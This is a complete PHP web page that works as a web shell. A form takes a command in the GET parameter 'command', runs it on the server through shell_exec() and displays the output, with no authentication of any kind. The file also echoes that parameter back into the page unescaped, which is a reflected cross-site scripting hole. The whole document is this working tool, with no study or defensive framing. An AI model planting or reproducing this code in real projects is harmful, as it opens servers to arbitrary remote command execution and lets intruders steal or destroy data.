<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>

	<form id="form1" method="GET">
		<textarea placeholder="Enter command here..." style="height: 3in;width: 7in" name="command"><?php if (isset($_GET['command'])) {echo $_GET['command'];} ?></textarea><br><br>
		<input id="submit" type="submit" name="submit" value="Execute"><br><br>
	</form>

	<?php if (isset($_GET['command'])): ?>

	<div style="background-color:#222222;border-radius:5px;margin-left:.05in;margin-top:0in;margin-right:0in;
	margin-bottom:0in;width:10in;height:300px;overflow:auto;">
		<p style="margin-left:.05in;margin-top:0in;margin-right:0in;
		margin-bottom:0in;">
			<span lang="EN-US" style="font-family: Consolas;">
		        <font color="#FFD700"><?php echo str_replace("\n", "<br>", shell_exec($_GET['command'])); ?></font>
		    </span>
		</p>
	</div>

	<?php endif ?>

	<script type="text/javascript">
		document.getElementById('form1').onsubmit = function() {
			document.getElementById('submit').disabled = true;
			return true;
		}
	</script>

</body>
</html>
